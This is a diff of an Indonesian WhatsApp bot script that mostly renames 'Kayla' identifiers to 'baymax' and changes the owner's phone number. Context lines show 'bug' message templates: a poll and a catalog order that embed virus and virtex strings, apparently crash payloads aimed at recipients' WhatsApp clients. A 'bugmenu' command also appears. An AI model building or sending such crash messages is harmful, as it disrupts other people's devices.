@@ -67,7 +67,7 @@ try {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await baymax.decodeJid(baymax.user.id)
-        const itsMeKayla = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const itsMebaymax = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const quoted = m.quoted ? m.quoted : m
@@ -112,12 +112,12 @@ try {
         const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
         const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
         const UltahCreator = new Date('Januari 19, 2023 00:00:00')
-        const CreatorKayla = new Date().getTime()
-        const KaylaBotWA = UltahCreator - CreatorKayla
-        const kayhari = Math.floor( KaylaBotWA / (1000 * 60 * 60 * 24));
-        const kayjam = Math.floor( KaylaBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
-        const kaymenit = Math.floor( KaylaBotWA % (1000 * 60 * 60) / (1000 * 60))
-        const kaydetik = Math.floor( KaylaBotWA % (1000 * 60) / 1000)
+        const CreatorGusti = new Date().getTime()
+        const baymaxBotWA = UltahCreator - CreatorGusti
+        const gushari = Math.floor( baymaxBotWA / (1000 * 60 * 60 * 24));
+        const gusjam = Math.floor( baymaxBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
+        const gusmenit = Math.floor( baymaxBotWA % (1000 * 60 * 60) / (1000 * 60))
+        const gusdetik = Math.floor( baymaxBotWA % (1000 * 60) / 1000)
         const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
         const senderNumber = sender.split('@')[0]
         const groupMetadata = m.isGroup ? await baymax.groupMetadata(m.chat).catch(e => {}) : ''
@@ -173,7 +173,7 @@ var mde = ['red','green','yellow','blue','magenta','cyan','white']
 var halale = mde[Math.floor(Math.random() * mde.length)]
 
 if (isCmd) {
-console.log(chalk.yellow.bgCyan.bold(' - 𝙺𝚊𝚢𝚕𝚊 𝙱𝚘𝚝 '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
+console.log(chalk.yellow.bgCyan.bold(' - 𝙱𝚊𝚢𝙼𝚊𝚡-𝙱𝚘𝚝 '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
 }
 
 if (isCmd && !isUser) {
@@ -191,7 +191,7 @@ console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${a
 return m.reply('「 ❗ 」Sabar Bang 5 Detik/Command')
 }
 
-if (isCmd && !itsMeKayla) antiSpam.addFilter(from)
+if (isCmd && !itsMebaymax) antiSpam.addFilter(from)
 
 for (let jid of mentionUser) {
 let user = global.db.users[jid]
@@ -218,7 +218,7 @@ user.afkReason = ''
 if (m.sender.startsWith('212')) return baymax.updateBlockStatus(m.sender, 'block')
 if (m.key.remoteJid == 'status@broadcast') return baymax.sendReadReceipt(from, m.sender, [m.key.id])
 
-async function sendKaylaMessage(chatId, message, options = {}){
+async function sendbaymaxMessage(chatId, message, options = {}){
     let generate = await generateWAMessage(chatId, message, options)
     let type2 = getContentType(generate.message)
     if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
@@ -268,7 +268,7 @@ key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...(from ? {
-remoteJid: '6287705048235@s.whatsapp.net' } : {}) }, 
+remoteJid: '6281390368580@s.whatsapp.net' } : {}) }, 
 message: { 
 extendedTextMessage: { 
 text: `${m.pushName}`, 
@@ -363,7 +363,7 @@ participant: `0@s.whatsapp.net`,
 },
 "message": {
 "pollCreationMessage": {
-"name": `baymax Bot ${virus}${virtex(prefix)}`,
+"name": `BAYMAX Bot ${virus}${virtex(prefix)}`,
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -378,7 +378,7 @@ participant: `0@s.whatsapp.net`,
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "SALAM DARI baymax BOT"
+"optionName": "SALAM DARI BAYMAX BOT"
 	}
 ],
 "selectableOptionsCount": 5
@@ -442,7 +442,7 @@ participant: `0@s.whatsapp.net`,
 "surface": "CATALOG",
 "message": `baymax Bot WhatsApp${ngazap(prefix)}`,
 "orderTitle": "baymax Bot WhatsApp${ngazap(prefix)}",
-"sellerJid": "6287705048235@s.whatsapp.net",
+"sellerJid": "6281390368580@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -524,7 +524,7 @@ templateButtons: [
 ]})
 }
 
-const botzkayla = "6287705048235@s.whatsapp.net"
+const botzbaymax = "6281390368580@s.whatsapp.net"
 const mark = "0@s.whatsapp.net"
 const timestamp = speed()
 const latensi = speed() - timestamp
@@ -537,25 +537,19 @@ location: { jpegThumbnail: ppnyauser } ,
 caption: `Hai Kak @${sender.split("@")[0]} 
 𝘚𝘢𝘺𝘢 BayMax 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.
 
-Nama ${itsMeKayla ? 'Owner' : 'User'} : ${pushname}
-Nomor ${itsMeKayla ? 'Owner' : 'User'} : ${sender.split("@")[0]}
+Nama ${itsMebaymax ? 'Owner' : 'User'} : ${pushname}
+Nomor ${itsMebaymax ? 'Owner' : 'User'} : ${sender.split("@")[0]}
 Jumlah User : ${pendaftar.length} User
-Status : ${itsMeKayla ? 'Owner' : 'User'}
+Status : ${itsMebaymax ? 'Owner' : 'User'}
 Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
 Runtime Bot : ${runtime(process.uptime())}
 Speed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬
 Otw Tahun Baru : ${jhari} 𝑯𝒂𝒓𝒊 ${jjam} 𝑱𝒂𝒎 ${jmenit} 𝑴𝒆𝒏𝒊𝒕 ${jdetik} 𝑫𝒆𝒕𝒊𝒌
 Otw Idul Fitri : ${hahari} 𝑯𝒂𝒓𝒊 ${hajam} 𝑱𝒂𝒎 ${hamenit} 𝑴𝒆𝒏𝒊𝒕 ${hadetik} 𝑫𝒆𝒕𝒊𝒌
 Otw Idul Adha : ${hihari} 𝑯𝒂𝒓𝒊 ${hijam} 𝑱𝒂𝒎 ${himenit} 𝑴𝒆𝒏𝒊𝒕 ${hidetik} 𝑫𝒆𝒕𝒊𝒌
-Otw Ultah Creator : ${kayhari} 𝑯𝒂𝒓𝒊 ${kayjam} 𝑱𝒂𝒎 ${kaymenit} 𝑴𝒆𝒏𝒊𝒕 ${kaydetik} 𝑫𝒆𝒕𝒊𝒌
-
-𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼
-𝗔𝗹𝗹𝗮𝗵 𝗦𝗪𝗧
-𝗢𝗿𝗮𝗻𝗴 𝗧𝘂𝗮
-*Gusti Panengah*
-𝗨𝘀𝗲𝗿 𝗕𝗼𝘁`,
-mentions : [sender, botzkayla, mark],
-footer: `Created By @${botzkayla.split("@")[0]}
+Otw Ultah Creator : ${gushari} 𝑯𝒂𝒓𝒊 ${gusjam} 𝑱𝒂𝒎 ${gusmenit} 𝑴𝒆𝒏𝒊𝒕 ${gusdetik} 𝑫𝒆𝒕𝒊𝒌`,
+mentions : [sender, botzbaymax, mark],
+footer: `Created By @${botzbaymax.split("@")[0]}
 WhatsApp By @${mark.split("@")[0]}`,
 buttons: butlocNye,
 headerType: "LOCATION"
@@ -902,7 +896,7 @@ await fs.unlinkSync(encmedia)
 }
 }
 
-if (m.isGroup && !m.key.fromMe && !itsMeKayla && antilink) {
+if (m.isGroup && !m.key.fromMe && !itsMebaymax && antilink) {
 if (!isBotAdmins) return
 if (budy.match(`chat.whatsapp.com`)) {
 baymax.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
@@ -910,7 +904,7 @@ baymax.groupParticipantsUpdate(m.chat, [sender], 'remove')
 }
 }
 
-if (m.isGroup && !m.key.fromMe && !itsMeKayla && antiwame) {
+if (m.isGroup && !m.key.fromMe && !itsMebaymax && antiwame) {
 if (!isBotAdmins) return
 if (budy.match(`wa.me`)) {
 baymax.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
@@ -970,7 +964,7 @@ listType: 1}
 
 switch (command) {
 case 'shutdown':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 reply(`Bye...`)
 await sleep(3000)
 process.exit()
@@ -989,7 +983,7 @@ baymax.sendMessage(from, listMenuMessage, { quoted: tyds })
 }
 break
 case 'allmenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${allmenu(prefix, hituet)}`,
 mentions:[sender],
 contextInfo:{
@@ -1008,7 +1002,7 @@ mentionedJid:[sender],
 })
 break
 case 'ownermenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1027,7 +1021,7 @@ mentionedJid:[sender],
 })
 break
 case 'othermenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1046,7 +1040,7 @@ mentionedJid:[sender],
 })
 break
 case 'downloadmenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1065,7 +1059,7 @@ mentionedJid:[sender],
 })
 break
 case 'bugmenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${bugmenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1084,7 +1078,7 @@ mentionedJid:[sender],
 })
 break
 case 'groupmenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1103,7 +1097,7 @@ mentionedJid:[sender],
 })
 break
 case 'funmenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1122,7 +1116,7 @@ mentionedJid:[sender],
 })
 break
 case 'stalkermenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1141,7 +1135,7 @@ mentionedJid:[sender],
 })
 break
 case 'randfotomenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${randfotomenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1160,7 +1154,7 @@ mentionedJid:[sender],
 })
 break
 case 'randvideomenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1179,7 +1173,7 @@ mentionedJid:[sender],
 })
 break
 case 'textpromenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1198,7 +1192,7 @@ mentionedJid:[sender],
 })
 break
 case 'photooxymenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1217,7 +1211,7 @@ mentionedJid:[sender],
 })
 break
 case 'ephoto360menu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1236,7 +1230,7 @@ mentionedJid:[sender],
 })
 break
 case 'cerpenmenu':
-sendKaylaMessage(from, { 
+sendbaymaxMessage(from, { 
 text: `Hai Kak @${sender.split("@")[0]}\n\n${cerpenmenu(prefix)}`,
 mentions:[sender],
 contextInfo:{
@@ -1381,7 +1375,7 @@ baymax.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
 }
 break
 case 'join': {
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!text) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
@@ -1400,7 +1394,7 @@ baymax.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLengt
 }
 break
 case 'autodltt':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (args[0] == 'on') {
 if (autodltt) return reply('*Sudah Aktif!*')
 autodltt = true
@@ -1418,7 +1412,7 @@ await baymax.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih
 }
 break
 case 'autosticker':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (args[0] == 'on') {
 if (autosticker) return reply('*Sudah Aktif!*')
 autosticker = true
@@ -1436,7 +1430,7 @@ await baymax.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau 
 }
 break
 case 'bc':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Teks Nya Bang?`)
 let anu = await store.chats.all().map(v => v.id)
 for (let yoi of anu) {
@@ -1448,8 +1442,8 @@ ${q}`})
 reply(`Succes`)
 break
 case 'ban':{
-if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 6287705048235`)
+if (!itsMebaymax) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 6281390368580`)
 orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
 let ceknye = await baymax.onWhatsApp(orgnye)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -1542,7 +1536,7 @@ break
 case 'menfes': case 'confes':
 if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
 if (m.isGroup) return reply(mess.private)
-if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 6287705048235|Hai Owner`)
+if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 6281390368580|Hai Owner`)
 if (text > 700) return reply(`Teks Kepanjangan`)
 num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 pesan = q.split('|')[1]
@@ -1587,7 +1581,7 @@ return reply(lidt)
 }
 break
 case 'leave':{
-if (m.isGroup && itsMeKayla && command == "leave") return baymax.groupLeave(from)
+if (m.isGroup && itsMebaymax && command == "leave") return baymax.groupLeave(from)
 if (m.isGroup) return reply("Only private chat")
 var room = Object.values(anon.anonymous).find(p => p.check(sender))
 if (!room) return reply("Anda tidak berada didalam room")
@@ -1610,7 +1604,7 @@ m.reply(`${m.pushName} sekarang afk\nAlasan : ${args.join(" ") ? args.join(" ") 
 break
 case 'antilink':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[0] == 'on') {
 if (antilink) return reply('*Sudah Aktif!*')
@@ -1630,7 +1624,7 @@ await baymax.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off
 break
 case 'antiwame':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[0] == 'on') {
 if (antiwame) return reply('*Sudah Aktif!*')
@@ -1650,7 +1644,7 @@ await baymax.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off
 break
 case 'add': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await baymax.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -1658,7 +1652,7 @@ await baymax.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply
 break
 case 'closetime':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[1] == 'detik') {
 var timer = args[0] * `1000`
@@ -1681,7 +1675,7 @@ reply(close)
 break
 case 'opentime':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[1] == 'detik') {
 var timer = args[0] * `1000`
@@ -1704,7 +1698,7 @@ reply(open)
 break
 case 'kick': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await baymax.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -1712,7 +1706,7 @@ await baymax.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => re
 break
 case 'promote': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await baymax.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -1720,7 +1714,7 @@ await baymax.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => r
 break
 case 'demote': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await baymax.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -1728,7 +1722,7 @@ await baymax.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => re
 break
 case 'hidetag': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (!q) return reply(`Teks?`)
 baymax.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
@@ -1736,7 +1730,7 @@ baymax.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a =>
 break
 case 'tagall': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeKayla) return reply(mess.admin)
+if (!isAdmins && !itsMebaymax) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (!q) return reply(`Teks?`)
 let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎